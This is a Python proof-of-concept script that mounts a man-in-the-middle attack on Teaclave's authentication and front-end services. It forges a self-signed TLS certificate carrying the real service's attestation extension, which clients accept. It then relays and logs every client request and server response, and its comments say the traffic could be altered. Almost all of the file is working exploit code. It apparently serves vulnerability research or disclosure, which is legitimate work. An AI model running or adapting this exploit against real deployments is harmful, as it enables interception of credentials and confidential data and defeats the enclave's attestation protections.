#!/usr/bin/env python3

"""
Lauch a man in the middle attack against local Teaclave AuthenticationService and FrontEndService.

The attack uses port 8776 for the AuthenticationService and port 8777 for the FrontEndService.
"""

import datetime
import json
import socket
import ssl
import struct
import threading
from contextlib import ExitStack
from typing import Any

from cryptography import x509
from cryptography.hazmat._oid import NameOID
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import ec

# Edit to change the address and ports of the Teaclave services to attack
HOSTNAME = "localhost"
AUTHENTICATION_SERVICE_ADDRESS = (HOSTNAME, 7776)
FRONTEND_SERVICE_ADDRESS = (HOSTNAME, 7777)


def create_fake_cert(address, cert_path, key_path):
    """
    Establish a connection to a Teaclave service and
    create a new TLS keypair in our control that will
    still be accepted by the client
    Write the corresponding PEM certificate file and PEM key to given paths.

    :param address: Address of the Teaclave service to attack as a tuple (hostname, port)
    :param cert_path: path where the PEM encoded certificate will be written
    :param key_path: path where the PEM encoded key will be written
    :return: nothing
    """
    # Connect to the Teaclave service and get Teaclave service certificate
    context = ssl._create_unverified_context()
    sock = socket.create_connection(address)
    channel = context.wrap_socket(sock, server_hostname=address[0])
    teaclave_cert = channel.getpeercert(binary_form=True)
    teaclave_cert = x509.load_der_x509_certificate(teaclave_cert, default_backend())

    # Generate a new self signed certificate

    # Generate our key
    key = ec.generate_private_key(ec.SECP256R1())

    # Write our key to disk
    with open(key_path, "wb") as f:
        f.write(
            key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption(),
            )
        )

    # Generate our certificate
    subject = issuer = x509.Name(
        [
            x509.NameAttribute(NameOID.COMMON_NAME, "Teaclave"),
        ]
    )
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(1)
        .not_valid_before(datetime.datetime.utcnow())
        .not_valid_after(
            # Our certificate will be valid for 10 days
            datetime.datetime.utcnow()
            + datetime.timedelta(days=10)
        )
        .add_extension(
            # Here's the interesting part :
            # We take the content of the x509 extension of the Teaclave certificate with the attestation evidence
            # and put it unchanged in our new certificate
            teaclave_cert.extensions[0].value,
            critical=False,
        )
        .sign(key, hashes.SHA256())
    )
    # Write our certificate out to disk.
    with open(cert_path, "wb") as f:
        f.write(cert.public_bytes(serialization.Encoding.PEM))


def read_message(sock: ssl.SSLSocket):
    """
    Read a message

    Adapted from the Teaclave source code (sdk/python/teaclave.py)
    Modified to raise an EOFError when the client closes the socket
    :param sock:
    :return:
    """
    response_len = sock.read(8)
    if not response_len:
        raise EOFError
    response_len = struct.unpack(">Q", response_len)
    raw = bytearray()
    total_recv = 0
    while total_recv < response_len[0]:
        data = sock.recv()
        total_recv += len(data)
        raw += data
    response = json.loads(raw)
    return response


def write_message(sock: ssl.SSLSocket, message: Any):
    """
    Write a Message

    Adapted from the Teaclave source code (sdk/python/teaclave.py)

    :param sock:
    :param message:
    :return:
    """
    message = json.dumps(message).encode()
    sock.sendall(struct.pack(">Q", len(message)))
    sock.sendall(message)


def mitm(service_name, mitm_address, teaclave_address):
    """
    Carry a MITM attack by impersonating the Teaclave service at teaclave_address
    Log every message sent by the client and the responses from the server

    Client <--> Attacker <--> Teaclave Service
                  ^^^                    ^^^
               @mitm_address         @teaclave_address

    :param mitm_address: Address and port for the attacker to bind
    :param teaclave_address: Address and port of the original Teaclave Service
    :return: nothing
    """
    print(f"🔌 MITM proxy listening on {mitm_address}, relaying to {teaclave_address}")

    create_fake_cert(
        teaclave_address, f"cert_{service_name}.pem", f"key_{service_name}.pem"
    )
    mitm_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    mitm_context.load_cert_chain(f"cert_{service_name}.pem", f"key_{service_name}.pem")

    with ExitStack() as stack:  # context manager to properly close sockets after use
        # Create a server side socket to receive the incoming connection from the client
        mitm_sock = stack.enter_context(
            socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        )
        mitm_sock.bind(mitm_address)
        mitm_sock.listen(5)
        mitm_ssock = stack.enter_context(
            mitm_context.wrap_socket(mitm_sock, server_side=True)
        )
        client_conn, mitm_addr = mitm_ssock.accept()

        # Create a socket to connect to the Teaclave service
        teaclave_sock = stack.enter_context(socket.create_connection(teaclave_address))
        context = ssl._create_unverified_context()
        teaclave_ssock = stack.enter_context(
            context.wrap_socket(teaclave_sock, server_hostname=teaclave_address[0])
        )

        # Then, we relay the message between the client and the Teaclave service
        # We log every messages, but we could as easily modify the requests of the client
        # and/or the reponses of the server while relaying them
        while True:
            try:
                request = read_message(client_conn)
                print(f"[Client/{service_name}]", request)
                write_message(teaclave_ssock, request)

                response = read_message(teaclave_ssock)
                print(f"[Teaclave/{service_name}]", response)
                write_message(client_conn, response)
            except EOFError:
                break


if __name__ == "__main__":
    # Start the MITM attacks against the AuthenticationService and FrontEndService from Teaclave
    # The attack could as easily target the other services

    print("⚡ Starting MITM attack")

    th1 = threading.Thread(
        target=mitm,
        args=(
            "authentication",
            (HOSTNAME, AUTHENTICATION_SERVICE_ADDRESS[1] + 1000),
            AUTHENTICATION_SERVICE_ADDRESS,
        ),
    )
    th1.start()

    th2 = threading.Thread(
        target=mitm,
        args=(
            "frontend",
            (HOSTNAME, FRONTEND_SERVICE_ADDRESS[1] + 1000),
            FRONTEND_SERVICE_ADDRESS,
        ),
    )
    th2.start()

    th1.join()
    th2.join()
